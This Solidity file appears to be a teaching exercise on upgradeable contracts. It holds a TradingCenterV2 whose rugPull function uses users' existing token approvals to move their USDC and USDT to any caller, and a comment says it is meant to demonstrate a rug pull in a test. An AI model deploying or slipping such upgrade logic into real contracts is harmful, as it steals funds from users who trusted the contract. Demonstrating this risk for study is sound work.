// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;
import {TradingCenter, IERC20} from "./TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter {
    bool public initializedv2;

    function initializedV2() external {
        require(initializedv2 == false, "already initialized");
        initializedv2 = true;
    }

    // 試圖在 test 中升級後 rug pull 搶走所有 user 的 usdc 和 usdt
    function rugPull(address user) external {
        uint256 usdcAllowance = usdc.allowance(user, address(this));
        uint256 usdtAllowance = usdt.allowance(user, address(this));

        if (usdc.balanceOf(user) < usdcAllowance) {
            usdc.transferFrom(user, msg.sender, usdc.balanceOf(user));
        } else {
            usdc.transferFrom(user, msg.sender, usdcAllowance);
        }

        if (usdt.balanceOf(user) < usdtAllowance) {
            usdt.transferFrom(user, msg.sender, usdt.balanceOf(user));
        } else {
            usdt.transferFrom(user, msg.sender, usdtAllowance);
        }
    }
}
